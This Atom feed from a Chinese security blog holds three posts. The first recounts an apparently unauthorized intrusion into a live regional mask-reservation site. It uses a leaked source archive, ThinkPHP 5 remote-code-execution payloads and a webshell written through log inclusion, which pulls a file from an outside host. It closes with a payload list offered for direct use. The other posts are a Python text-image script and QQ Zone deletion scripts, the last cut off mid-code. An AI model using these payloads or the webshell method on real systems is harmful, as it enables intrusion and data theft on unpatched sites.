<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>BoBo&#39;s Blog</title>
  
  <subtitle>Day Day Up~</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://bobosec.top/"/>
  <updated>2020-03-06T08:46:12.269Z</updated>
  <id>http://bobosec.top/</id>
  
  <author>
    <name>BoBo</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>记一次公益SRC挖掘过程</title>
    <link href="http://bobosec.top/2020/03/06/SRC/"/>
    <id>http://bobosec.top/2020/03/06/SRC/</id>
    <published>2020-03-06T04:59:43.000Z</published>
    <updated>2020-03-06T08:46:12.269Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>  疫情当前，各省都开了口罩预约网站，由于本小白在的地区比较落后，网络安全也不是很发达，也没有得到很好的重视，所以友情检测一波，具体漏洞已经交给360补天~</p><h3 id="前期准备工作"><a href="#前期准备工作" class="headerlink" title="前期准备工作"></a>前期准备工作</h3><p>首先到了目标站点，扫了一波端口，发现3306还有21，22端口都是开启的，尝试弱密码登录失败，又试了一下数据库，发现数据库不允许远程登录。于是，冒着被ban的风险，直接御剑，发现了存在public目录和web.zip???</p><p><img src="https://s2.ax1x.com/2020/03/06/3bzC9O.jpg" alt="3bzC9O.jpg"></p><p>立马下载解压！发现了数据库的配置还有乱七八糟一堆东西</p><p><img src="https://s2.ax1x.com/2020/03/06/3bzVHI.jpg" alt="3bzVHI.jpg"></p><h3 id="渗透开始"><a href="#渗透开始" class="headerlink" title="渗透开始"></a>渗透开始</h3><p>有数据库账户密码，不过是测试的demo数据库，而且不允许远程连接，感觉有点难搞~但是thinkphp的字样格外闪耀~所以试一下前面的TP5漏洞</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/public/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br></pre></td></tr></table></figure><p>发现没有执行whoami的命令，但是网页有报错，往下翻，能找到具体版本号</p><p><img src="https://s2.ax1x.com/2020/03/06/3qSli6.jpg" alt="3qSli6.jpg"></p><p>这下直接找对应小版本号的漏洞试试~</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method=__construct&amp;filter[]=system&amp;method=get</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2020/03/06/3qpfnH.jpg" alt="3qpfnH.jpg"></p><p>发现system函数是被禁用了的，所以需要绕过一下。</p><p>这里感谢一下小石师傅的耐心指导~成功rce</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=-1&amp;_method=__construct&amp;filter=phpinfo&amp;method=GET</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2020/03/06/3q9Gbd.jpg" alt="3q9Gbd.jpg"></p><p>然后想着能不能getshell看一下数据库，就准备传马，在网上找到了白夜鬼魅师傅的文章</p><p>感觉白夜师傅遇到的情况和我的很相似，于是准备按照师傅思路来用报错日志包含个一句话进去，然后利用一句话连接getshell。说干就干~</p><p>先试一下__include_file是不是能执行，发现可以执行，只不过是被限制了读文件的内容，现在就可以用日志来包含恶意代码执行命令啦~</p><p><img src="https://s2.ax1x.com/2020/03/06/3qA3Kf.jpg" alt="3qA3Kf.jpg"></p><p>这时候一句话写入成功了已经，在报错日志里，现在只需要找到log目录就行，这个log的目录名字很好猜，就是年月日.log所以我们直接访问，也可以直接copy新的一句话到一个文件夹然后用菜到蚁剑等工具连接。</p><p><a href="https://imgchr.com/i/3qEO7F" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/03/06/3qEO7F.jpg" alt="3qEO7F.jpg"></a></p><p>现在copy一个新的一句话进去为了方便一会儿直接连接就好啦</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;server[]=<span class="number">-1</span>&amp;get[]=./runtime/log/<span class="number">202003</span>/<span class="number">06.</span>log&amp;<span class="number">1337</span>=<span class="keyword">echo</span> copy(<span class="string">"http://XXXX/1.txt"</span>,<span class="string">"/www/wwwroot/www.test.cn/1.php"</span>);</span><br></pre></td></tr></table></figure><p>本次测试基于TP5.0.12，给大佬们附上其他payload，有时候直接可以拿来用了~</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br><span class="line">?s=index/\think\Request/input&amp;filter=phpinfo&amp;data=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">?s=index/think\config/get&amp;name=database.hostname</span><br><span class="line"></span><br><span class="line">?s=index/think\config/get&amp;name=database.password</span><br><span class="line"></span><br><span class="line">?s=index/\think\Request/input&amp;filter=system&amp;data=id</span><br><span class="line"></span><br><span class="line">?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=%<span class="number">3</span>C?php%<span class="number">20</span>phpinfo();?%<span class="number">3</span>E</span><br><span class="line"></span><br><span class="line">?s=index/\think\view\driver\Php/display&amp;content=<span class="meta">&lt;?php</span>%<span class="number">20</span>phpinfo();<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br><span class="line"></span><br><span class="line">?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</span><br><span class="line"></span><br><span class="line">?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br><span class="line"></span><br><span class="line">?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</span><br></pre></td></tr></table></figure><p>最后再次感谢小石师傅和鬼魅dalao~还有Blacat大兄弟~</p>]]></content>
    
    <summary type="html">
    
      记一次公益src挖掘过程
    
    </summary>
    
      <category term="渗透测试" scheme="http://bobosec.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="SRC挖掘" scheme="http://bobosec.top/tags/SRC%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>Valentine&#39;s Day</title>
    <link href="http://bobosec.top/2020/02/13/Valentine-s-Day/"/>
    <id>http://bobosec.top/2020/02/13/Valentine-s-Day/</id>
    <published>2020-02-13T03:07:22.000Z</published>
    <updated>2020-02-13T03:18:50.643Z</updated>
    
    <content type="html"><![CDATA[<p> 今天看猪哥的python公众号发现了一段好玩的代码，可以用来情人节给小姐姐~</p><p>先上效果图</p><p><img src="https://s2.ax1x.com/2020/02/13/1qKxyD.jpg" alt="1qKxyD.jpg"></p><p><img src="https://s2.ax1x.com/2020/02/13/1qKvQO.jpg" alt="1qKvQO.jpg"></p><p>由于图片不是高清，所以会有点模糊，只需要高清图即可</p><p>上代码~</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw, ImageFont</span><br><span class="line">font_size = <span class="number">7</span></span><br><span class="line">text = <span class="string">"我喜欢你！"</span><span class="comment">#可任意修改文字</span></span><br><span class="line">img_path = <span class="string">"C://Users//Desktop//pics//fbb.jpg"</span><span class="comment">#原图地址</span></span><br><span class="line"></span><br><span class="line">img_raw = Image.open(img_path)</span><br><span class="line">img_array = img_raw.load()</span><br><span class="line"></span><br><span class="line">img_new = Image.new(<span class="string">"RGB"</span>, img_raw.size, (<span class="number">100</span>, <span class="number">100</span>, <span class="number">100</span>))<span class="comment">#像素设置(0,0,0)至(255,255,255)根据图片具体颜色设置吧</span></span><br><span class="line">draw = ImageDraw.Draw(img_new)</span><br><span class="line">font = ImageFont.truetype(<span class="string">'C:/Windows/fonts/Dengl.ttf'</span>, font_size)<span class="comment">#自定义字体，这里选的是等线体</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">character_generator</span><span class="params">(text)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(text)):</span><br><span class="line">            <span class="keyword">yield</span> text[i]</span><br><span class="line"></span><br><span class="line">ch_gen = character_generator(text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">0</span>, img_raw.size[<span class="number">1</span>], font_size):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, img_raw.size[<span class="number">0</span>], font_size):</span><br><span class="line">        draw.text((x, y), next(ch_gen), font=font, fill=img_array[x, y], direction=<span class="keyword">None</span>)</span><br><span class="line"></span><br><span class="line">img_new.convert(<span class="string">'RGB'</span>).save(<span class="string">"C://Users//Desktop//pics//fbb1.jpg"</span>)<span class="comment">##输出图片</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      情人节用python生成一些有意思的图片
    
    </summary>
    
      <category term="杂七杂八" scheme="http://bobosec.top/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"/>
    
    
      <category term="实用技巧" scheme="http://bobosec.top/tags/%E5%AE%9E%E7%94%A8%E6%8A%80%E5%B7%A7/"/>
    
  </entry>
  
  <entry>
    <title>Qzone-Delete</title>
    <link href="http://bobosec.top/2020/02/12/Qzone-Delete/"/>
    <id>http://bobosec.top/2020/02/12/Qzone-Delete/</id>
    <published>2020-02-12T02:45:02.000Z</published>
    <updated>2020-02-12T09:14:24.798Z</updated>
    
    <content type="html"><![CDATA[<p>今天逛github发现了一些有关QQ的好玩的东西分享给大家~</p><h2 id="QQ空间说说删除-from-https-github-com-Passkou-ClearQzoneEmotions"><a href="#QQ空间说说删除-from-https-github-com-Passkou-ClearQzoneEmotions" class="headerlink" title="QQ空间说说删除(from:https://github.com/Passkou/ClearQzoneEmotions)"></a>QQ空间说说删除(from:<a href="https://github.com/Passkou/ClearQzoneEmotions" target="_blank" rel="noopener">https://github.com/Passkou/ClearQzoneEmotions</a>)</h2><ol><li>下载chrome driver</li></ol><p>   记得要把driver和脚本放在同一个文件夹下，否则需要自己修改路径。</p><p>   打包的exe文件链接：<a href="https://share.weiyun.com/5QLi0AC" target="_blank" rel="noopener">https://share.weiyun.com/5QLi0AC</a></p>   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver <span class="keyword">as</span> web</span><br><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> get, post</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> path</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_g_tk</span><span class="params">(p_skey)</span>:</span></span><br><span class="line">    hashes = <span class="number">5381</span></span><br><span class="line">    <span class="keyword">for</span> letter <span class="keyword">in</span> p_skey:</span><br><span class="line">        hashes += (hashes &lt;&lt; <span class="number">5</span>) + ord(letter)</span><br><span class="line">    <span class="keyword">return</span> hashes &amp; <span class="number">0x7fffffff</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_dt</span><span class="params">(tid)</span>:</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">"hostuin"</span>: qq,</span><br><span class="line">        <span class="string">"tid"</span>: tid,</span><br><span class="line">        <span class="string">"t1_source"</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="string">"code_version"</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="string">"format"</span>: <span class="string">"fs"</span>,</span><br><span class="line">        <span class="string">"qzreferrer"</span>: <span class="string">r"https://user.qzone.qq.com/%s/infocenter"</span> % qq</span><br><span class="line">    &#125;</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">"g_tk"</span>: g_tk</span><br><span class="line">    &#125;</span><br><span class="line">    post(url=<span class="string">"https://user.qzone.qq.com/proxy/domain/taotao.qzone.qq.com/cgi-bin/emotion_cgi_delete_v6"</span>,</span><br><span class="line">                       params=params, data=data, cookies=cookie</span><br><span class="line">                       )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_dt</span><span class="params">()</span>:</span></span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">"uin"</span>: qq,</span><br><span class="line">        <span class="string">"inCharset"</span>: <span class="string">"utf-8"</span>,</span><br><span class="line">        <span class="string">"outCharset"</span>: <span class="string">"utf-8"</span>,</span><br><span class="line">        <span class="string">"hostUin"</span>: qq,</span><br><span class="line">        <span class="string">"notice"</span>: <span class="string">"0"</span>,</span><br><span class="line">        <span class="string">"sort"</span>: <span class="string">"0"</span>,</span><br><span class="line">        <span class="string">"pos"</span>: <span class="string">"0"</span>,</span><br><span class="line">        <span class="string">"num"</span>: <span class="string">"20"</span>,</span><br><span class="line">        <span class="string">"cgi_host"</span>: <span class="string">"https://user.qzone.qq.com/proxy/domain/taotao.qq.com/cgi-bin/emotion_cgi_msglist_v6"</span>,</span><br><span class="line">        <span class="string">"code_version"</span>: <span class="string">"1"</span>,</span><br><span class="line">        <span class="string">"format"</span>: <span class="string">"jsonp"</span>,</span><br><span class="line">        <span class="string">"need_private_comment"</span>: <span class="string">"1"</span>,</span><br><span class="line">        <span class="string">"g_tk"</span>: g_tk</span><br><span class="line">    &#125;</span><br><span class="line">    req = get(<span class="string">"https://user.qzone.qq.com/proxy/domain/taotao.qq.com/cgi-bin/emotion_cgi_msglist_v6"</span>, params=params, cookies=cookie)</span><br><span class="line">    text = req.content.decode(<span class="string">"utf-8"</span>)</span><br><span class="line">    text = text.replace(<span class="string">"_Callback("</span>, <span class="string">""</span>)</span><br><span class="line">    text = text[:<span class="number">-2</span>]</span><br><span class="line">    js = json.loads(text)</span><br><span class="line">    msg_list = js[<span class="string">"msglist"</span>]</span><br><span class="line">    <span class="keyword">if</span> msg_list <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span>, []</span><br><span class="line">    m_list = []</span><br><span class="line">    <span class="keyword">for</span> msg <span class="keyword">in</span> msg_list:</span><br><span class="line">        tid = msg[<span class="string">"tid"</span>]</span><br><span class="line">        content = msg[<span class="string">"content"</span>]</span><br><span class="line">        localtime = time.localtime(msg[<span class="string">"created_time"</span>])</span><br><span class="line">        t = time.strftime(<span class="string">"%Y/%m/%d %H:%M"</span>, localtime)</span><br><span class="line">        m_list.append((tid, t, content))</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">True</span>, m_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> g_tk, cookie, qq</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> path.isfile(<span class="string">"chromedriver.exe"</span>):</span><br><span class="line">        print(<span class="string">"chromedriver.exe 文件不存在！"</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    driver = web.Chrome(<span class="string">"chromedriver.exe"</span>)</span><br><span class="line">    driver.get(<span class="string">"https://qzone.qq.com/"</span>)</span><br><span class="line">    input(<span class="string">"完成登录后按回车继续..."</span>)</span><br><span class="line">    cookies = driver.get_cookies()</span><br><span class="line">    cookie = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> cookies:</span><br><span class="line">        name = c[<span class="string">"name"</span>]</span><br><span class="line">        value = c[<span class="string">"value"</span>]</span><br><span class="line">        cookie[name] = str(value)</span><br><span class="line">    p_skey = cookie[<span class="string">"p_skey"</span>]</span><br><span class="line">    qq = cookie[<span class="string">"uin"</span>][<span class="number">1</span>:]</span><br><span class="line">    print(<span class="string">"你的QQ号：%s"</span> % qq)</span><br><span class="line">    g_tk = get_g_tk(p_skey)</span><br><span class="line">    confirm = <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        gt = get_dt()</span><br><span class="line">        <span class="keyword">if</span> gt[<span class="number">0</span>]:</span><br><span class="line">            msg_list = gt[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">for</span> msg <span class="keyword">in</span> msg_list:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> confirm:</span><br><span class="line">                    c = input(<span class="string">"已成功获取到说说，确认删除？（输入大写Y确认）："</span>)</span><br><span class="line">                    <span class="keyword">if</span> c == <span class="string">"Y"</span>:</span><br><span class="line">                        confirm = <span class="keyword">True</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        exit()</span><br><span class="line">                print(<span class="string">"正在删除说说：%s %s"</span> % (msg[<span class="number">1</span>], msg[<span class="number">2</span>]))</span><br><span class="line">                del_dt(msg[<span class="number">0</span>])</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"说说已清空"</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    driver.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(<span class="string">"""====================</span></span><br><span class="line"><span class="string">欢迎使用 自动清空QQ空间说说 程序！</span></span><br><span class="line"><span class="string">版本：V1.0</span></span><br><span class="line"><span class="string">制作：Passkou</span></span><br><span class="line"><span class="string">bilibili：https://space.bilibili.com/12440199</span></span><br><span class="line"><span class="string">===================="""</span>)</span><br><span class="line">run()</span><br><span class="line">input(<span class="string">"按回车键退出..."</span>)</span><br></pre></td></tr></table></figure><h2 id="QQ留言删除"><a href="#QQ留言删除" class="headerlink" title="QQ留言删除"></a>QQ留言删除</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.ui <span class="keyword">import</span> WebDriverWait</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> expected_conditions <span class="keyword">as</span> EC</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Delete</span>:</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">self.__u = <span class="string">'你的QQ'</span></span><br><span class="line">self.__p = <span class="string">'你的密码'</span></span><br><span class="line">self.__driver = webdriver.Chrome(<span class="string">'C:\Program Files (x86)\Google\Chrome\Application\chromedriver'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 登录qq空间</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(self)</span>:</span></span><br><span class="line"><span class="comment"># driver.get 方法会打开请求的URL，WebDriver 会等待页面完全加载完成之后才会返回，</span></span><br><span class="line"><span class="comment"># 即程序会等待页面的所有内容加载完成，JS渲染完毕之后才继续往下执行。</span></span><br><span class="line"><span class="comment"># 注意：如果这里用到了特别多的 Ajax 的话，程序可能不知道是否已经完全加载完毕。</span></span><br><span class="line">self.__driver.get(<span class="string">"https://qzone.qq.com"</span>)</span><br><span class="line">self.__driver.switch_to.frame(<span class="string">'login_frame'</span>)</span><br><span class="line">self.__driver.find_element_by_id(<span class="string">'switcher_plogin'</span>).click()</span><br><span class="line">self.__driver.find_element_by_id(<span class="string">'u'</span>).send_keys(self.__u)</span><br><span class="line">self.__driver.find_element_by_id(<span class="string">'p'</span>).send_keys(self.__p)</span><br><span class="line">self.__driver.find_element_by_id(<span class="string">'login_button'</span>).click()</span><br><span class="line"><span class="comment"># 从frame返回</span></span><br><span class="line">self.__driver.switch_to.default_content()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">switch2board</span><span class="params">(self)</span>:</span></span><br><span class="line"><span class="comment"># 找到留言板按钮</span></span><br><span class="line">WebDriverWait(self.__driver, <span class="number">10</span>).until(</span><br><span class="line">EC.presence_of_element_located((By.XPATH, <span class="string">'//a[@title="留言板"]'</span>))</span><br><span class="line">).click()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 黄钻过期提醒</span></span><br><span class="line"><span class="comment"># WebDriverWait(self.__driver, 10).until(</span></span><br><span class="line"><span class="comment"># EC.presence_of_element_located((By.ID, "dialog_button_1"))</span></span><br><span class="line"><span class="comment"># ).click()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 确保留言板所在的frame已经加载完并切换</span></span><br><span class="line">WebDriverWait(self.__driver, <span class="number">10</span>).until(</span><br><span class="line">EC.frame_to_be_available_and_switch_to_it((By.XPATH, <span class="string">'//iframe[@id="tgb"]'</span>))</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getTotalPage</span><span class="params">(self)</span>:</span></span><br><span class="line"><span class="comment"># 页数为一页的时候没有a标签</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="comment"># 为什么</span></span><br><span class="line"><span class="comment"># totalPage = driver.find_element_by_xpath('//span[@class="mod_pagenav_count"]/a[last()]').text</span></span><br><span class="line"><span class="comment"># 为什么输出为空，text属性不是文本内容？？ 还是说是谷歌浏览器的问题？？</span></span><br><span class="line"><span class="keyword">return</span> int(self.__driver.find_element_by_xpath(<span class="string">'//span[@class="mod_pagenav_count"]/a[last()]'</span>)</span><br><span class="line">.get_attribute(<span class="string">'innerHTML'</span>))</span><br><span class="line"><span class="keyword">except</span> EC.NoSuchElementException:</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 点击确定删除按钮，并回到留言板的frame</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handlePopWin</span><span class="params">(self, selectedItem=None)</span>:</span></span><br><span class="line"><span class="comment"># 弹窗不在frame中</span></span><br><span class="line">self.__driver.switch_to.default_content()</span><br><span class="line">WebDriverWait(self.__driver, <span class="number">10</span>).until(</span><br><span class="line">EC.presence_of_element_located((By.XPATH, <span class="string">'//a[@class="qz_dialog_layer_btn qz_dialog_layer_sub"]'</span>))</span><br><span class="line">).click()</span><br><span class="line"><span class="keyword">if</span> selectedItem:</span><br><span class="line">print(<span class="string">'删除 %d 条记录'</span> % selectedItem)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print(<span class="string">'删除一页记录'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 确保留言板所在的frame已经加载完并切换</span></span><br><span 